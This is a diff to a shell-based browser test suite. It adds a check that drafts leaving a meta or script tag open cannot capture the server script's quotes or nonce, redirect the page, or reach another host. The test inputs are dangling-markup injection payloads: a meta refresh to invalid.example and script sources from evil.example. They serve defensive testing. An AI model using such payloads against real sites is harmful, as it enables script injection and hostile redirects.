@@ -374,4 +374,41 @@ async page => {
 JS
 ok "a page's own script, external image and refresh do nothing, and no request leaves for another host"
 
+# A draft that leaves a tag open where the server's script goes: an open meta at the end would take the
+# script's quotes and `>` as its own, and an open script tag its nonce. Either would reach another host.
+left_open() {
+  local o
+  o="$(open_panel "$1")"
+  printf '%s' "$2" > "$(field "$o" draft)"
+  publish "$1" >/dev/null
+  step "left-open-${1:0:8}" "$(field "$o" address)" <<'JS'
+async page => {
+  const ctx = await page.context().browser().newContext();
+  const foreign = [];
+  await ctx.route('**/*', (route) => {
+    const u = new URL(route.request().url());
+    if (u.origin === '__ORIGIN__') return route.continue();
+    foreign.push(u.href);
+    return route.abort();
+  });
+  const p = await ctx.newPage();
+  await p.goto('__PANEL__');
+  await p.waitForTimeout(3000);
+  const url = p.url();
+  await ctx.close();
+  const bad = [];
+  if (url !== '__PANEL__') bad.push(`the page went to ${url}`);
+  if (foreign.length) bad.push(`requests to another host: ${foreign.join(', ')}`);
+  if (bad.length) throw new Error(bad.join('; '));
+}
+JS
+}
+left_open 0000dddd-1111-2222-3333-444444444444 \
+  '<p>An open meta at the end.</p><meta http-equiv="refresh" content="0;url=https://invalid.example/'
+left_open 0000eeee-1111-2222-3333-444444444444 \
+  '<html><head><link rel="stylesheet" href="/base/panel.css"><script src="https://evil.example/x.js" a=</head><body><p>An open script tag.</p></body></html>'
+left_open 0000ffff-1111-2222-3333-444444444444 \
+  '<p>An open script tag at the end.</p><script src="https://evil.example/y.js" a="'
+ok "a tag the draft leaves open takes neither the server script's quotes nor its nonce"
+
 echo "all base checks passed"
